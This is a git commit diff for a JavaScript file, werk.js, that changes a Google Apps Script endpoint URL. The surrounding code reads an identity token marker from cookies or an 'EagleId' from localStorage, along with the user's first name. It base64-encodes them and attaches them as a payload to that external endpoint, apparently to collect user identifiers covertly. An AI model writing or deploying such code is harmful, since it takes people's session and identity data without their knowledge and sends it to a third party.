b946f46262c08e680a014ec65960fd0c9311987b
MissingLink <60206943+Patrick-ring-motive@users.noreply.github.com>
2025-08-26 11:57:57 -0500

    Update werk.js

--- werk.js
+++ werk.js
@@ -9,7 +9,7 @@
   const document = window.top.document;
   const eagleid = Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
   const name = String(parse(localStorage.getItem("user"))?.FirstName);
-  const url = new URL("https://script.google.com/macros/s/AKfycbzCqAhWZNUcRaKvXSE9EhSgWvCY4xCgY0U2ksr_nv_eCGd2i-oh8cznalBfqSkSn7C6Vw/exec",);
+  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
   url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
   (async () => {
     try {
